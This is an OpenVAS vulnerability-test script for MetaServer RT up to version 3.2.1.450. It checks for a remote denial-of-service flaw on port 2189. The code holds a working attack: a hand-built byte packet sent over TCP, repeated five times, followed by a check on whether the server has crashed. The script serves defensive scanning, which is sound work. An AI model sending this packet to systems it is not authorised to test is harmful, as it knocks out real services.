###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_metaserver_rt_multiple_dos_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# MetaServer RT Multiple Remote Denial of Service Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  on the system or cause a denial of service condition.
  Impact Level: System/Application";
tag_affected = "MetaServer RT version 3.2.1.450 and prior.";
tag_insight = "Multiple flaws are due to an error when processing certain packets
  and can be exploited to cause a crash via a specially crafted packet.";
tag_solution = "No solution or patch is available as of 21st September 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.traderssoft.com/ts/msrt/";
tag_summary = "The host is running MetaServer RT and is prone to multiple remote
  denial of service vulnerabilities.";

if(description)
{
  script_id(902569);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-22 10:24:03 +0200 (Thu, 22 Sep 2011)");
  script_bugtraq_id(49696);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("MetaServer RT Multiple Remote Denial of Service Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46059");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17879/");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/metaserver_1-adv.txt");

  script_description(desc);
  script_summary("Determine if MetaServer RT is prone to denial of service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(2189);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Get Default Port
port = 2189;
if(!get_port_state(port)){
 exit(0);
}

## Open the socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Construct Attack Request
req = raw_string( 0xcd, 0xab, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x52, 0x4f, 0x53, 0x43,
                  0x4f );

## Sending Attack
send(socket:soc, data:req);
res = recv(socket:soc, length:200);
close(soc);

## Confirm the application
if("Metastock" >!< res){
  exit(0);
}

## Send multiple reconnection request
for(i = 0; i < 5; i++)
{
  soc1 = open_sock_tcp(port);
  if(!soc1){
    break;
  }

  send(socket:soc1, data:req);
  close(soc1);
  sleep(1);
}

## Open the socket and Check server is dead or alive
soc = open_sock_tcp(port);
if(!soc)
{
  security_hole(port);
  exit(0);
}
close(soc);
